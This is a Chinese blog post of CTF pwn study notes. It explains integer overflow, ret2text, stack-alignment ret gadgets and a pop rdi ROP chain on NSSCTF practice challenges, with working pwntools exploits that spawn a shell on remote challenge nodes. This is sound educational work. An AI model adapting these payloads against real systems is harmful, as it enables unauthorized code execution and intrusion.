---
title: PWN刷题笔记
published: 2026-04-12
description: ..第一次参加长城杯...这AWDP和ISW是什么啊，我不是密码、Misc方向的吗...发奋转型Pwn。
tags: [CTF, 学习,Pwn]
category: CTF
---
## 整数溢出
做这题我们需要先知道什么是小端序存储
假设一个无符号整型(unsigned long)0x6162636465666768
存储在内存0xA0000处
按从低到高字节顺序存储
0xA0000 -> 0x68

0xA0001 -> 0x67

0xA0002 -> 0x66

0xA0003 -> 0x65

0xA0004 -> 0x64

0xA0005 -> 0x63

0xA0006 -> 0x62

0xA0007 -> 0x61

（大端序则反之）
![整数溢出](./images/zhengshuyichu.webp)
如图，v4为4字节，却尝试用scanf将它视为%lld读入8字节整数，因此会覆盖到位于栈高字节的n1314（rbp-ch），当n1314等于520（0x208）时调用system，那便能拿到`shell`

因此输入0x20800000000在内存中为00 00 00 00 08 02,前面4个00即v4的内存区域，此时n1314被视为520

如果直接说有点抽象的话我们可以看一张图：
![整数溢出解释](./images/zhengshuyichu1.webp)
这下就很好理解了，那写exp就比较通透了：
```python
from pwn import *
r=remote('node7.anna.nssctf.cn',28805)
#r = process("./main")
context(os="linux",arch="amd64",log_level="debug")
num = 0x20865666768
#gdb.attach(r)
r.recvline()
r.sendline(str(num))
r.interactive()
```
![flag](./images/zhengshuyichu2.webp)

## ROP
![ROP](./images/ROP1.webp)
如图，scanf尝试向v4输入但没有上限(`%s`遇到回车才停止读取)，因此导致栈溢出 但是main函数里没有找到类似`system("/bin/sh")`的语句，于是通过查找字符串等方式我们不难发现在vuln这个函数中存在这个语句，那么我们的目的就是通过输入特定的字符串，让程序溢出到vuln函数
![ROP2](./images/ROP2.webp)
那么怎么return到vuln函数呢？其实让溢出的值是vuln函数的地址就行了。
```python
from pwn import *
context(os='linux',arch='amd64',log_level="debug")
r = remote('node7.anna.nssctf.cn', 23929)
vuln = 0x4011DD
playload = b"a"*0x28+p64(vuln)
r.recvline()
# gdb.attach(r)
r.sendline(playload)
r.interactive()
```
关于0x28，也就是没溢出的字节数是怎么来的，其实有很多方法，最基本的就是通过gdb慢慢调试出来，另一种就行在ida里看，就是[rbp-20h]=0x28。还有一种就是pwntools里的cyclic(~~最公式的一种~~)
![flag](./images/ROP3.webp)

## ret2text
![ret2text1](images/ret2text1.webp)
![ret2text2](images/ret2text2.webp)
这题其实和上一题没什么区别，只需要把跳转的地址转到if语句里就行了。**直接跳转到目标执行位置可以更好的解决问题**
在ida里找到if语句的地址便可以写exp了
![ret2text2](images/ret2text3.webp)
```python
from pwn import *
r = remote('node6.anna.nssctf.cn', 20798)
context(os='linux', arch='amd64', log_level='debug')
playload = b"a"*0x28+p64(0x4011ff)
#gdb.attach(r)
r.recvline()
r.sendline(playload)
r.interactive()
```

## ret调整栈帧
![ret2text1](images/ret2text1.webp)
![ROP2](./images/ROP2.webp)
这题和`ROP`那题看起来几乎是一样的，先试着使用ROP相同的办法写下exp看看，结果发现无法拿到shell，我们使用gdb具体看一下:
![ret2gdb](images/ret2tiaozhengzhanzheng.webp)
这里有一个非常重要的知识点：xmm寄存器只有在rsp的末尾为0时才能正常执行，这里的rsp是以8结尾了所以无法正常执行了。  

通过gdb还能发现我们是可以进入`vuln`函数的，但是进入了`vuln`函数我们就做不出什么操作了，于是考虑我们要在进入`vuln`函数之前调整好栈，让其移动8个字节(*这里其实还有一个知识点就是在64位系统的rsp里所以数据都是以8字节存储在栈上，所以结尾不是8就是0*)

**那么怎么移动呢？**
![ret2gdb](images/ret2tiaozhengzhanzheng2.webp)
首先我们通过gdb可以发现`main`函数最后是一个`return`函数，所以我们需要使用它return(return函数的作用是把栈顶rsp指向的8个字节作为地址进行下一步执行传给rip~~不知道怎么说清楚了..看下面的图吧~~)到`vuln`函数，并且这样就顺便让栈上多了一个步骤从而实现了移动8字节(~~这一块好难解释啊...~~)
![ret2gdbret](images/ret2tiaozhengzhanzheng3.webp)
现在就剩下最后一个任务了，就是找到return函数的地址，这里我们使用ROPgadget来查找
![ret2gdbret](images/ret2tiaozhengzhanzheng4.webp)
成功在`0x40101a`处找到return函数
```python
from pwn import *
r = remote('node7.anna.nssctf.cn', 21013)
#r = process('./main')
context(os='linux', arch='amd64', log_level='debug')
playload = b'A' * 0x28 + p64(0x40101a) + p64(0x4011dd)
#gdb.attach(r)
r.recvline()
r.sendline(playload)
r.interactive()
```

## callpop
![call](images/call1.webp)
![call](images/call2.webp)
做这题我们需要先了解一下`call`和`pop`，`call`顾名思义就是“打电话”把函数叫过来执行--跳转到目标地址，遇到ret返回，通常用于函数调用。而`pop`是指将栈顶即rsp寄存器指向的内容弹进目标寄存器内。
同时我们还需要知道在64位系统中使用寄存器来传参，并且在linux系统中寄存器是有顺序的，按顺序是rdi，rsi，rdx，rcx，r8，r9，如果还有多余参数再传到栈中。
现在我们再来看题目，mian函数的内容还是和之前一样的，但是vuln没有`/bin/sh`了，这时候我们在ida里用shift+F12显示程序中所有字符串
![call](images/call3.webp)发现是有的，于是我们再用ROPgadget查找`/bin/sh`的地址
![call](images/call4.webp)
那我们如何让system执行`/bin/sh`，而不是`ls`呢？再来ida里分析
![call](images/call5.webp)
这里的意思是command(*也就是`ls`*)被leave进了rdi里，之后call了(也就是调用了)system。于是我们可以想到在调用之前如果我们把`/bin/sh`的地址放进system(*ida里可以看到在在0x4011A5处*)里面，相当于自己造了一个`system('/bin/sh')`，那不就可以拿到shell了吗！
那具体怎么操作呢？这里就需要用到`pop`了，再使用一下ROPgadget查找`pop rdi`的地址，发现在0x40125B处。现在我们只需要根据上述的思路按照调用的顺序写exp就行了

```python
from pwn import *
context(arch='amd64', os='linux',log_level='debug')
r = remote('node6.anna.nssctf.cn', 26072)
system = 0x4011A5
poprdi = 0x40125B
binsh = 0x404048
playload = b'a'*0x48+p64(poprdi)+p64(binsh)+p64(system)
r.recvline()
#gdb.attach(r)
r.sendline(playload)
r.interactive()
```
